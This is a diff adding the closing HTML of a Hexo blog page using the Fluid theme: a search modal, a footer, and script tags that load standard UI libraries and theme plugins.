+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
